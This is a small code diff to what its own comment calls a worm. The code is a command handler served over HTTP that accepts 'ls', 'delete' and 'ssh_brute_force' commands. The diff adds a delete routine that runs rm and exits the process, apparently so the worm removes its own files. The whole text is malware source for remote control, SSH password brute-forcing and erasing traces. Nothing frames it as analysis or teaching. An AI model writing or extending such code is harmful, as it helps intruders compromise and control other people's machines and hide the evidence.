@@ -182,8 +182,8 @@ def determine_if():
 HTTP SERVER FUNCTIONALITIES
 """
 def delete():
-	# TODO: KILL python process and delete all worm files
-	return "deleted"
+	process = subprocess.run(["rm","*"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
+	sys.exit()
 		
 def ls(path):
 	process = subprocess.run(["ls",path],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
@@ -201,7 +201,7 @@ def execute_command(command,ls_path=None,ssh_bf_target=None):
 	if command == "ls":
 		return ls(ls_path)
 	elif command == "delete":
-		return delete()
+		delete()
 		
 	elif command == "ssh_brute_force":
 		return str(ssh_brute_force(ssh_bf_target,22))
